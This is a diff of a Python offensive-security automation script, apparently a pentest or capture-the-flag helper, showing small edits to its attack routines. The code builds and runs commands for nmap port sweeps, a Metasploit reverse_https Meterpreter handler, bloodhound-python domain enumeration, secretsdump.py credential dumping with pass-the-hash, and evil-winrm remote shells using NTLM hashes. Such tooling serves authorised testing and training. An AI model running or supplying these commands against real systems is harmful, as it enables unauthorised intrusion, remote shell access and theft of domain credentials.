@@ -758,7 +758,7 @@ while True:
    if selection =='0':   
       checkParams = testOne()
       
-      if (checkParams != 1) and (POR[:1] == ""):
+      if (checkParams != 1) and (PTS[:5] == "EMPTY"):
          print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
          command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
          PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
@@ -1253,7 +1253,7 @@ while True:
       if checkParams != 1:        
          with open("meterpreter.rc", "w") as write:
             write.write("use exploit/multi/handler\n")
-            write.write("set PAYLOAD /windows/meterpreter/reverse_https\n")
+            write.write("set PAYLOAD /windows/x64/meterpreter/reverse_https\n")
             write.write("set LHOST " + localIP + "\n")
             write.write("set LPORT " + checkParams + "\n")
             write.write("clear\n")
@@ -2422,6 +2422,7 @@ while True:
          if PAS[:2] != "''":
             command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
          else:
+            print("[i] Using HASH value as password credential...")
             command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
 
       print("\n[*] Checking downloaded files...\n")
@@ -2468,6 +2469,7 @@ while True:
          if PAS[:2] != "''":
             command(keyPath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > secrets.tmp")
          else:
+            print("[i] Using HASH value as password credential...")
             command(keyPath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")
             
          command("sed -i '/:::/!d' secrets.tmp")
@@ -3354,9 +3356,9 @@ while True:
          if NTM[:5] != "EMPTY":
             print("[i] Using the HASH value as a password credential...")
             if IP46 == "-4":
-               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
             else:
-               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
          else:
             if IP46 == "-4":
                command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
